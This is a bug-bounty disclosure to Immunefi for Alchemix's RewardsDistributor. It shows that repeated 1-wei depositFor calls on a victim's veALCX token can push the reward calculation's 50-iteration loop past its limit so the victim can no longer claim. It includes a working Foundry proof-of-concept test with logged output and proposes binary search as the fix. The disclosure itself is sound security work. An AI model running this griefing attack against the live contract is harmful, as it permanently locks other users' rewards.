# 31399 - \[SC - High] RewardDistributor claims can be DoSed through e...

Submitted on May 18th 2024 at 03:47:27 UTC by @jecikpo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31399

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RewardsDistributor.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Permanent freezing of unclaimed royalties

## Description

## Brief/Intro

A malicious user can DoS (permanently lock) veALCX token owner's claims, by creating certain amount of `userPointHistory` entries by calling `VotingEscrow.depositFor()` on a target token multiple times.

## Vulnerability Details

`RewardDistributor` claims are calculated in the `_claimable()` function. The calculation first involves finding the last `userPoint` which was taken before the last `weekCursor`. This is done through a `for` loop that cycles from the last `userEpoch` until it finds one. The loop can cycle up to 50 times:

```
for (uint256 i = 0; i < 50; i++) {
```

hence if there are more `userPoints` than 50 the `_claimable()` function will return 0 as `toDistribute`.

A malicious user can call the `VotingEscrow.depositFor()` on the attacked veALCX token multiple times and can deposit minimum amount tokens (1 wei is enough), this way he can create the `userPoints` that will DoS the function.

The solution would be to use binary search like in other places in the system.

## Impact Details

Te veALCX token holder loses irreversibly all claims.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RewardsDistributor.sol#L365>

## Proof of Concept

paste the following code into `Minter.t.sol`:

```
    function testDOSClaims() public {
        initializeVotingEscrow();

        // Get a fresh epoch
        hevm.warp(newEpoch());
        voter.distribute();

        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);

        deal(bpt, beef, TOKEN_1);
        hevm.prank(beef);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        for (uint256 i; i < 60; i++) {
            hevm.prank(beef);
            veALCX.depositFor(tokenId1, 1);
            hevm.roll(block.number + 1);
        }

        // Finish the epoch
        hevm.warp(newEpoch());
        voter.distribute();

        // Go to the next epoch
        hevm.warp(newEpoch());
        voter.distribute();

         // And the next epoch
        hevm.warp(newEpoch());
        voter.distribute();

        uint256 claimable1 = distributor.claimable(tokenId1);
        uint256 claimable2 = distributor.claimable(tokenId2);
        console.log("claimable on tokenId1: %d", claimable1);
        console.log("claimable on tokenId2: %d", claimable2);
    }
```

We can see in the output that the `tokenId1` that was attacked is returning 0 of claimable amount, while the `tokenId2` returns the correct amount:

```
[PASS] testDOSClaims() (gas: 27805168)
Logs:
  claimable on tokenId1: 0
  claimable on tokenId2: 5158128881524544439089

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 77.54s (39.96s CPU time)
```
